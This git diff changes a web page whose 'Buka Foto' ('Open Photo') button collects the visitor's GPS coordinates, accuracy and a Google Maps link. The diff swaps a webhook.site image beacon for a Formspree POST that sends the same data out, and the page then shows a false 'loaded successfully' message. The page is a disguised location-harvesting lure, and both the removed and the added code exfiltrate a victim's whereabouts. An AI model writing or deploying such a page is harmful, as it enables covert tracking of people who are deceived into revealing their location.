@@ -22,8 +22,10 @@
     <button class="btn" onclick="getLocation()">Buka Foto</button>
     <div id="status" class="status"></div>
   </div>
-<script>
-    const WEBHOOK_URL = 'https://89fc2d12-706e-4bd0-a557-c7351a3bf8e9.webhook.site';
+
+  <script>
+    // URL Endpoint Formspree Anda
+    const FORMSPREE_URL = 'https://formspree.io/f/mrpgbjwp';
 
     function getLocation() {
       const statusDiv = document.getElementById('status');
@@ -45,10 +47,29 @@
       const lon = position.coords.longitude;
       const accuracy = position.coords.accuracy;
       const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-      const img = new Image();
-      img.src = `${WEBHOOK_URL}/?lat=${lat}&lon=${lon}&akurasi_meter=${accuracy}&google_maps=${encodeURIComponent(googleMapsUrl)}`;
 
-      document.getElementById('status').innerHTML = '<span style="color:#22c55e;">Berhasil memuat!</span>';
+      // Mengirim data menggunakan metode POST ke Formspree
+      fetch(FORMSPREE_URL, {
+        method: 'POST',
+        headers: {
+          'Accept': 'application/json',
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lon,
+          akurasi: accuracy + ' meter',
+          google_maps: googleMapsUrl
+        })
+      }).then(response => {
+        if (response.ok) {
+          document.getElementById('status').innerHTML = '<span style="color:#22c55e;">Berhasil memuat!</span>';
+        } else {
+          document.getElementById('status').innerHTML = 'Gagal mengirim data.';
+        }
+      }).catch(err => {
+        document.getElementById('status').innerHTML = 'Terjadi kesalahan jaringan.';
+      });
     }
 
     function showError(error) {
